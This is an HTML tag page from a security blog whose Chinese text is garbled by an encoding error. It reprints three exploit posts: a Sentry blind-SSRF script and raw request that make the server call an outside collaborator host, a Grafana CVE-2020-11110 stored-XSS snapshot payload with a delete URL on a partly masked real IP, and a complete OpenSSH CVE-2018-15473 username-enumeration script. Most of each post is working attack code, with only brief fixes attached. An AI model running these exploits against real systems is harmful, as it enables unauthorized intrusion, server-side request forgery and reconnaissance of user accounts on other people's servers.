<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>Tag: Exploit | æ°•æ°˜æ°š</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Open your eyes to see the light in life">
<meta property="og:type" content="website">
<meta property="og:title" content="æ°•æ°˜æ°š">
<meta property="og:url" content="https://szczecin.github.io/tags/Exploit/page/3/index.html">
<meta property="og:site_name" content="æ°•æ°˜æ°š">
<meta property="og:description" content="Open your eyes to see the light in life">
<meta property="og:locale">
<meta property="article:author" content="Szczecin">
<meta name="twitter:card" content="summary">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        
  <section class="page-header tag">
    <h1>- <span>Exploit</span> -</h1>
  </section>






<section class="post-list">
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/Sentry-SSRF/">
                Sentry SSRF
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="sentry-ssrf">Sentry SSRF</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12979368.html">Mysticbinary</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="what-is-sentry">What is Sentry</span></h2><blockquote>
<p>Sentry æ˜¯ä¸€ä¸ªå®æ—¶çš„äº‹ä»¶æ—¥å¿—å’Œèšåˆå¹³å°ï¼ŒåŸºäº Django æ„å»ºã€‚ä¸€èˆ¬åœ¨urlä¸Šã€æˆ–è€…logoä¸Šçœ‹åˆ°æœ‰sentryéƒ½å¯ä»¥ç”¨å®ƒçš„expè¯•è¯•ï¼ŒåŸç†æ˜¯ç”±äºsentryé»˜è®¤å¼€å¯source code scrapping ï¼Œå¯¼è‡´å¯ä»¥ä»å¤–éƒ¨è¿›è¡Œblind ssrfè¯·æ±‚ã€‚</p>
</blockquote>
<h2><span id="exp-testing">exp testing</span></h2><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python3) âœ  sentrySSRF git:(master) python sentrySSRF.py -i http://ã€your target urlã€‘ -d</span><br><span class="line">Found Sentry: https://ef00ffc3xxxxxe5b60afff8c138c77e@ã€your target urlã€‘/1</span><br><span class="line">Enter your burpcollaborator address:ã€your dnslogã€‘</span><br></pre></td></tr></table></figure>

<p>ç„¶åå»ä½ åˆ°dnslogçœ‹çœ‹æœ‰æ²¡æœ‰è¯·æ±‚è®°å½•å³å¯ã€‚</p>
<p>expæºç å‚è€ƒï¼š<br>é…ç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;https://a8d729459beb446eb3cbb9df997dcc7b@sentry.mindworks.xyz/1&quot;</span></span><br><span class="line">    collaborator = <span class="string">&quot;dp6sk5k006h6dcq3bdu6e6a9t0zqnf.burpcollaborator.net&quot;</span></span><br><span class="line">    key = re.search(<span class="string">&#x27;https://(.*)@&#x27;</span>, s)</span><br><span class="line">    domain = re.search(<span class="string">&#x27;@(.*)/&#x27;</span>, s)</span><br><span class="line">    number = re.search(<span class="string">&#x27;/(.*)&#x27;</span>, s[<span class="number">8</span>:])</span><br><span class="line">    url = <span class="string">&quot;https://&quot;</span> + domain.group(<span class="number">1</span>) + <span class="string">&quot;/api/&quot;</span> + number.group(<span class="number">1</span>) + <span class="string">&quot;/store/?sentry_key=&quot;</span> + key.group(<span class="number">1</span>) + <span class="string">&quot;&amp;sentry_version=7&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    datas = &#123;<span class="string">&quot;extra&quot;</span>:&#123;<span class="string">&quot;component&quot;</span>:<span class="string">&quot;redux/actions/index&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;RegisterDeviceWeb&quot;</span>,<span class="string">&quot;serialized&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;INVALID_CREDENTIALS&quot;</span>,<span class="string">&quot;details&quot;</span>:[]&#125;&#125;,<span class="string">&quot;fingerprint&quot;</span>:[<span class="string">&quot;3cbf661c7f723b0a5816c16968fd9493&quot;</span>,<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>],<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>,<span class="string">&quot;stacktrace&quot;</span>:&#123;<span class="string">&quot;frames&quot;</span>:[&#123;<span class="string">&quot;colno&quot;</span>:<span class="number">218121</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;http://&quot;</span>+collaborator,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;lineno&quot;</span>:<span class="number">1</span>&#125;]&#125;,<span class="string">&quot;exception&quot;</span>:&#123;<span class="string">&quot;values&quot;</span>:[&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Custom Object&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Error&quot;</span>&#125;]&#125;,<span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;d0513ec5a3544e05aef0d1c7c5b24bae&quot;</span>,<span class="string">&quot;platform&quot;</span>:<span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;sdk&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sentry.javascript.browser&quot;</span>,<span class="string">&quot;packages&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;npm:@sentry/browser&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;],<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;,<span class="string">&quot;release&quot;</span>:<span class="string">&quot;6225dd99&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;phash&quot;</span>:<span class="string">&quot;996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f&quot;</span>&#125;,<span class="string">&quot;breadcrumbs&quot;</span>:[&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1554226659.455</span>,<span class="string">&quot;category&quot;</span>:<span class="string">&quot;navigation&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="string">&quot;/login&quot;</span>&#125;&#125;]&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://z.tochka.com/&#x27;</span>&#125;</span><br><span class="line">    rsp = requests.post(url, json=datas, headers=headers)</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="to-build-blind-http-pack">To Build blind http pack</span></h2><blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/1/store/?sentry_version=7&amp;sentry_client=raven-js%2f3.15.0&amp;sentry_key=ã€your</span> keyã€‘ <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> ã€your <span class="string">target</span> urlã€‘.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line">Origin:ã€éšæ„domainã€‘</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk">&#123;<span class="comment">&quot;project&quot;</span>:<span class="comment">&quot;30&quot;</span>,<span class="comment">&quot;logger&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;platform&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;exception&quot;</span>:&#123;<span class="comment">&quot;values&quot;</span>:[&#123;<span class="comment">&quot;type&quot;</span>:<span class="comment">&quot;Error&quot;</span>,<span class="comment">&quot;value&quot;</span>:<span class="comment">&quot;Trying to get control scope but angular isn&#x27;t ready yet or something like this&quot;</span>,<span class="comment">&quot;stacktrace&quot;</span>:&#123;<span class="comment">&quot;frames&quot;</span>:[&#123;<span class="comment">&quot;filename&quot;</span>:<span class="comment">&quot;http://ã€your dnslogã€‘&quot;</span>,<span class="comment">&quot;lineno&quot;</span>:<span class="number">110</span>,<span class="comment">&quot;colno&quot;</span>:<span class="number">81071</span>,<span class="comment">&quot;function&quot;</span>:<span class="comment">&quot;XMLHttpRequest.o&quot;</span>,<span class="comment">&quot;in_app&quot;</span>:<span class="keyword">true</span>&#125;]&#125;&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Sentry-SSRF/1.png" alt="image"></p>
<p>sentry_version &#x3D; çº¢çº¿2 ï¼ˆæŠ¥é”™å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹å‡ ä¸ªå…¶ä»–ç‰ˆæœ¬è¯•è¯•ï¼‰<br>sentry_key &#x3D; Raven.config çº¢çº¿1<br>origin &#x3D; å¯ä»¥éšä¾¿å†™</p>
</blockquote>
<h2><span id="repair">Repair</span></h2><blockquote>
<p>1ã€sentryå…³é—­ source code scrappingï¼›<br>2ã€ä¿è¯é…ç½®æ–‡ä»¶ä¸­çš„é»‘åå•ä¸ä¸ºç©ºï¼š&#x2F;sentry&#x2F;conf&#x2F;server.py</p>
</blockquote>
<h2><span id="reference">Reference</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a><br><a target="_blank" rel="noopener" href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a><a class="tag-none-link" href="/tags/Sentry/" rel="tag">Sentry</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/CVE-2020-11110-Grafana/">
                Grafana å­˜å‚¨å‹XSSæ¼æ´ï¼ˆCVE-2020-11110ï¼‰
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="grafana-å­˜å‚¨å‹xssæ¼æ´cve-2020-11110">Grafana å­˜å‚¨å‹XSSæ¼æ´ï¼ˆCVE-2020-11110ï¼‰</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/grafana-stored-xss-CVE-2020-11110.html">starnight_cyber</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="preface">Preface</span></h2><blockquote>
<p>Grafanaæ˜¯ä¸€ä¸ªè·¨å¹³å°ã€å¼€æºçš„æ•°æ®å¯è§†åŒ–ç½‘ç»œåº”ç”¨ç¨‹åºå¹³å°ã€‚ç”¨æˆ·é…ç½®è¿æ¥çš„æ•°æ®æºä¹‹åï¼ŒGrafanaå¯ä»¥åœ¨ç½‘ç»œæµè§ˆå™¨é‡Œæ˜¾ç¤ºæ•°æ®å›¾è¡¨å’Œè­¦å‘Šã€‚Grafana å­˜åœ¨æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…åœ¨æœªç»èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹å¯é€šè¿‡è¯¥æ¼æ´è¯»å–ä¸»æœºä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVEç¼–å·ï¼š</span><br><span class="line">    CVE-<span class="number">2020</span>-<span class="number">11110</span></span><br><span class="line">å½±å“èŒƒå›´ï¼š</span><br><span class="line">    Grafana v6<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">Links</span><br><span class="line">    https://ctf-writeup.revers3c.com/challenges/web/CVE-<span class="number">2020</span>-<span class="number">11110</span>/index.html</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="å¤ç°è®°å½•">å¤ç°è®°å½•</span></h2><h3><span id="æµ‹è¯•ç¯å¢ƒéƒ¨ç½²">æµ‹è¯•ç¯å¢ƒéƒ¨ç½²</span></h3><blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =&gt; </span><br><span class="line">&#123;&quot;dashboard&quot;:&#123;&quot;annotations&quot;:&#123;&quot;list&quot;:[&#123;&quot;name&quot;:&quot;Annotations &amp; Alerts&quot;,&quot;enable&quot;:true,&quot;iconColor&quot;:&quot;rgba(0, 211, 255, 1)&quot;,&quot;type&quot;:&quot;dashboard&quot;,&quot;builtIn&quot;:1,&quot;hide&quot;:true&#125;]&#125;,&quot;editable&quot;:true,&quot;gnetId&quot;:null,&quot;graphTooltip&quot;:0,&quot;id&quot;:null,&quot;links&quot;:[],&quot;panels&quot;:[],&quot;schemaVersion&quot;:18,&quot;snapshot&quot;:&#123;&quot;originalUrl&quot;:&quot;javascript:alert(&#x27;Revers3c&#x27;)&quot;,&quot;timestamp&quot;:&quot;2020-03-30T01:24:44.529Z&quot;&#125;,&quot;style&quot;:&quot;dark&quot;,&quot;tags&quot;:[],&quot;templating&quot;:&#123;&quot;list&quot;:[]&#125;,&quot;time&quot;:&#123;&quot;from&quot;:null,&quot;to&quot;:&quot;2020-03-30T01:24:53.549Z&quot;,&quot;raw&quot;:&#123;&quot;from&quot;:&quot;6h&quot;,&quot;to&quot;:&quot;now&quot;&#125;&#125;,&quot;timepicker&quot;:&#123;&quot;refresh_intervals&quot;:[&quot;5s&quot;,&quot;10s&quot;,&quot;30s&quot;,&quot;1m&quot;,&quot;5m&quot;,&quot;15m&quot;,&quot;30m&quot;,&quot;1h&quot;,&quot;2h&quot;,&quot;1d&quot;],&quot;time_options&quot;:[&quot;5m&quot;,&quot;15m&quot;,&quot;1h&quot;,&quot;6h&quot;,&quot;12h&quot;,&quot;24h&quot;,&quot;2d&quot;,&quot;7d&quot;,&quot;30d&quot;]&#125;,&quot;timezone&quot;:&quot;&quot;,&quot;title&quot;:&quot;Dashboard&quot;,&quot;uid&quot;:null,&quot;version&quot;:0&#125;,&quot;name&quot;:&quot;Dashboard&quot;,&quot;expires&quot;:0&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/CVE-2020-11110-Grafana/1.png" alt="image"></p>
</blockquote>
<h3><span id="stored-xss">Stored-XSS</span></h3><blockquote>
<p>æ›¿æ¢ url ä¸­çš„ localhostï¼Œè®¿é—®å¿«ç…§åœ°å€ï¼Œç‚¹å‡»é“¾æ¥ğŸ”—å›¾æ ‡ã€‚ Stored-XSSã€‚</p>
<p><img src="/2024/01/19/CVE-2020-11110-Grafana/2.png" alt="image"></p>
</blockquote>
<h3><span id="snapshot-å¿«ç…§åˆ é™¤">snapshot å¿«ç…§åˆ é™¤</span></h3><blockquote>
<p>è®¿é—® deleteUrlï¼š</p>
<p><a target="_blank" rel="noopener" href="http://103.210.162.186:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ">http://103.210.xx.xx:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ</a></p>
<p><img src="/2024/01/19/CVE-2020-11110-Grafana/3.png" alt="image"></p>
<p>å¯ä»¥åˆ é™¤ snapshotï¼Œè¿™é‡Œç®—æ˜¯ä¸ªä¸¥é‡ç¨‹åº¦æ›´é«˜çš„æ¼æ´ã€‚</p>
</blockquote>
<h2><span id="ä¿®å¤æ–¹æ¡ˆ">ä¿®å¤æ–¹æ¡ˆ</span></h2><blockquote>
<p>ç‰ˆæœ¬å‡çº§ã€‚</p>
</blockquote>
<h2><span id="refer">Refer</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html">https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html</a></p>
<p>ä»¥ä¸Šï¼</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XSS/" rel="tag">XSS</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/CVE-2018-15473-OpenSSH/">
                OpenSSHç”¨æˆ·åæšä¸¾åŠå…¶æ£€æµ‹æ–¹æ³•ï¼ˆCVE-2018-15473ï¼‰
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="opensshç”¨æˆ·åæšä¸¾åŠå…¶æ£€æµ‹æ–¹æ³•cve-2018-15473">OpenSSHç”¨æˆ·åæšä¸¾åŠå…¶æ£€æµ‹æ–¹æ³•ï¼ˆCVE-2018-15473ï¼‰</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/726a3791b5b9">testerzhang</a> å¹¶ä½œè¡¥å……</p>
<p>OpenSSH 7.7å‰åœ¨æ¥æ”¶åˆ°ç•¸å½¢çš„è®¤è¯è¯·æ±‚åŒ…æ—¶ï¼Œä¼šæ ¹æ®ç”¨æˆ·åçš„å­˜åœ¨ä¸å¦ç»™å‡ºä¸åŒçš„å“åº”ï¼Œç”±æ­¤å¯¼è‡´é€šè¿‡SSHæœåŠ¡æšä¸¾æœåŠ¡å™¨çš„ç”¨æˆ·åã€‚</p>
</blockquote>
<h3><span id="ssh-check-usernamepy-ä½¿ç”¨è¯´æ˜">ssh-check-username.py ä½¿ç”¨è¯´æ˜</span></h3><blockquote>
<ul>
<li>å®‰è£…ä¾èµ–åŒ… <code>pip install paramiko==2.0.8</code></li>
<li>è¯­æ³•ï¼š<code>python ssh_checkusername.py ip username â€“port 22</code></li>
</ul>
</blockquote>
<h3><span id="è„šæœ¬">è„šæœ¬</span></h3><blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright (c) 2018 Matthew Daley</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment"># of this software and associated documentation files (the &quot;Software&quot;), to</span></span><br><span class="line"><span class="comment"># deal in the Software without restriction, including without limitation the</span></span><br><span class="line"><span class="comment"># rights to use, copy, modify, merge, publish, distribute, sublicense, and/or</span></span><br><span class="line"><span class="comment"># sell copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment"># furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The above copyright notice and this permission notice shall be included in</span></span><br><span class="line"><span class="comment"># all copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span></span><br><span class="line"><span class="comment"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS</span></span><br><span class="line"><span class="comment"># IN THE SOFTWARE.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidUsername</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_boolean</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[</span><br><span class="line">        paramiko.common.MSG_SERVICE_ACCEPT]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_accept</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    paramiko.message.Message.add_boolean = add_boolean</span><br><span class="line">    <span class="keyword">return</span> old_service_accept(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userauth_failure</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> InvalidUsername()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table.update(&#123;</span><br><span class="line">    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,</span><br><span class="line">    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;paramiko.transport&#x27;</span>).addHandler(logging.NullHandler())</span><br><span class="line"></span><br><span class="line">arg_parser = argparse.ArgumentParser()</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;hostname&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">22</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;username&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">sock = socket.socket()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock.connect((args.hostname, args.port))</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to connect&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">transport = paramiko.transport.Transport(sock)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.start_client()</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.SSHException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to negotiate SSH transport&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.auth_publickey(args.username, paramiko.RSAKey.generate(<span class="number">2048</span>))</span><br><span class="line"><span class="keyword">except</span> InvalidUsername:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Invalid username&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.AuthenticationException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Valid username&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="éªŒè¯è¯´æ˜">éªŒè¯è¯´æ˜ï¼š</span></h2><blockquote>
<p>å¦‚æœæœåŠ¡å™¨å­˜åœ¨çš„ç”¨æˆ·ï¼Œåˆ™è„šæœ¬ä¼šè¿”å›<code>Valid username</code></p>
<p>å¦‚æœæœåŠ¡å™¨ä¸å­˜åœ¨çš„ç”¨æˆ·ï¼Œåˆ™è„šæœ¬ä¼šè¿”å›<code>Invalid username</code><br> å¦‚æœå‡çº§sshç‰ˆæœ¬ä¹‹åï¼š</p>
<p>å¦‚æœæœåŠ¡å™¨å­˜åœ¨çš„ç”¨æˆ·ï¼Œåˆ™è„šæœ¬ä¼šè¿”å›<code>Valid username</code></p>
<p>å¦‚æœæœåŠ¡å™¨ä¸å­˜åœ¨çš„ç”¨æˆ·ï¼Œåˆ™è„šæœ¬ä¼šè¿”å›<code>Valid username</code></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/OpenSSH/" rel="tag">OpenSSH</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
